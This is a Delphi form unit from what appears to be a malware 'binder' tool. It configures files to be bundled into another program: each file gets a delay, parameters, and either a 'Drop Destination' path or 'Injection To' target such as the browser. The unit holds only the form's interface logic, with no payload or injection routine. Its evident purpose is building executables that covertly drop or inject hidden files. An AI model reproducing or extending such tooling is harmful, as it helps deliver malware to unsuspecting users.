unit U_FrmBinder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,U_FrmMain, bsSkinBoxCtrls, bsSkinCtrls, StdCtrls, Mask, se_form,
  ComCtrls, BusinessSkinForm;

type
  TFrm_Binder = class(TForm)
    FB_Panel: TbsSkinExPanel;
    FB_LabelFile: TbsSkinStdLabel;
    FB_LabelExec: TbsSkinStdLabel;
    FB_LabelDelay: TbsSkinStdLabel;
    FB_LabelDelayMS: TbsSkinStdLabel;
    FB_LabelParam: TbsSkinStdLabel;
    FB_EditFile: TbsSkinEdit;
    FB_BtnFile: TbsSkinButton;
    FB_ComboExec: TbsSkinComboBox;
    FB_GroupBox: TbsSkinGroupBox;
    FB_L_ExecPath: TbsSkinStdLabel;
    FB_L_ExecName: TbsSkinStdLabel;
    FB_C_ExecPath: TbsSkinComboBox;
    FB_C_ExecName: TbsSkinEdit;
    FB_BtnAdd: TbsSkinButton;
    FB_BtnCancel: TbsSkinButton;
    FB_EditlDelay: TbsSkinNumericEdit;
    FB_EditParam: TbsSkinEdit;
    FB_AnimeForm: TseAnimationForm;
    bsBusinessSkinForm1: TbsBusinessSkinForm;
    procedure FB_BtnAddClick(Sender: TObject);
    procedure FB_BtnCancelClick(Sender: TObject);
    procedure FB_PanelClose(Sender: TObject);
    procedure FB_ComboExecChange(Sender: TObject);
    procedure FB_C_ExecPathChange(Sender: TObject);
    procedure FB_BtnFileClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frm_Binder: TFrm_Binder;

implementation

{$R *.dfm}
uses
u_Type, u_Utils;



procedure TFrm_Binder.FB_BtnAddClick(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
X : String;
begin
  if FB_Panel.Caption = 'Binder Add' then
  begin
    if (FB_EditFile.Text <> '') and FileExists(FB_EditFile.Text) then
    begin
      List := Frm_Main.List_Binder.Items.Add;
      List.Caption := FB_EditFile.Text;
      List.SubItems.Add(Get_File_Size(FB_EditFile.Text,true));
      new(data);
      Data^.Delay := Trunc(FB_EditlDelay.Value);
      Data^.Exec := FB_ComboExec.ItemIndex;
      Data^.Path := FB_C_ExecPath.ItemIndex;
      Data^.Name := FB_C_ExecName.Text;
      Data^.Parameter :=  FB_EditParam.Text;
      List.Data := Data;
      Close;
    end else
      Frm_Main.FM_Message.MessageDlg('Your File Not Exists, Please Input Correct File...!!!',mtWarning,[mbOk],0);
  end else
  if (Pos('der Edit ',FB_Panel.Caption) <> 0) then
  begin
    if (FB_EditFile.Text <> '') and FileExists(FB_EditFile.Text) then
    begin
      X := FB_Panel.Caption;
      delete(x,1,12);
      List := Frm_Main.List_Binder.Items.Item[strtoint(x)];
      Data := List.Data;
      List.Caption := FB_EditFile.Text;
      List.SubItems[0] := Get_File_Size(FB_EditFile.Text,true);
      Data^.Delay := Trunc(FB_EditlDelay.Value);
      Data^.Exec := FB_ComboExec.ItemIndex;
      Data^.Path := FB_C_ExecPath.ItemIndex;
      Data^.Name := FB_C_ExecName.Text;
      Data^.Parameter :=  FB_EditParam.Text;
      List.Data := Data;
      Close;
    end else
      Frm_Main.FM_Message.MessageDlg('Your File Not Exists, Please Input Correct File...!!!',mtWarning,[mbOk],0);
  end;
end;

procedure TFrm_Binder.FB_BtnCancelClick(Sender: TObject);
begin
  Close;
end;

procedure TFrm_Binder.FB_BtnFileClick(Sender: TObject);
begin
  Frm_Main.opendialog.Filter := 'Binded Files|*.*';
  Frm_Main.opendialog.FileName := '';
  if Frm_Main.opendialog.Execute Then
  begin
    if (Frm_Main.opendialog.FileName <> '') and fileexists(Frm_Main.opendialog.FileName) then
      FB_EditFile.Text := Frm_Main.opendialog.FileName;
  end;
end;

procedure TFrm_Binder.FB_ComboExecChange(Sender: TObject);
begin
  if FB_ComboExec.ItemIndex = 0 then
  begin
    FB_L_ExecName.Enabled := false;
    FB_L_ExecPath.Enabled := false;
    FB_C_ExecName.Enabled := false;
    FB_C_ExecPath.Enabled := false;
    FB_C_ExecName.Text := '';
    FB_C_ExecPath.ItemIndex := -1;
  end else
  if FB_ComboExec.ItemIndex = 1 then
  begin
    FB_GroupBox.Caption := 'Drop Destination : ';
    FB_L_ExecName.Enabled := true;
    FB_C_ExecName.Enabled := true;
    FB_L_ExecPath.Enabled := true;
    FB_C_ExecPath.Enabled := true;
    FB_C_ExecName.Text := '';
    if FB_C_ExecPath.Items[0] = 'Browser' then
    begin
      FB_C_ExecPath.Items.Delete(0);
    end;
    FB_C_ExecPath.ItemIndex := 0;
  end else
  if FB_ComboExec.ItemIndex = 2 then
  begin
    FB_GroupBox.Caption := 'Injection To : ';
    FB_L_ExecPath.Enabled := true;
    FB_C_ExecPath.Enabled := true;
    FB_L_ExecName.Enabled := false;
    FB_C_ExecName.Enabled := false;
    FB_C_ExecName.Text := '';
    if FB_C_ExecPath.Items[0] <> 'Browser' then
    begin
      FB_C_ExecPath.Items.Insert(0,'Browser');
    end;
    FB_C_ExecPath.ItemIndex := 0;
  end;
end;

procedure TFrm_Binder.FB_C_ExecPathChange(Sender: TObject);
begin
  if FB_C_ExecPath.Text = 'Browser' then
  begin
    FB_L_ExecName.Enabled := false;
    FB_C_ExecName.Enabled := false;
  end else
  begin
    FB_L_ExecName.Enabled := true;
    FB_C_ExecName.Enabled := true;
  end;
end;

procedure TFrm_Binder.FB_PanelClose(Sender: TObject);
begin
  Close;
end;

end.
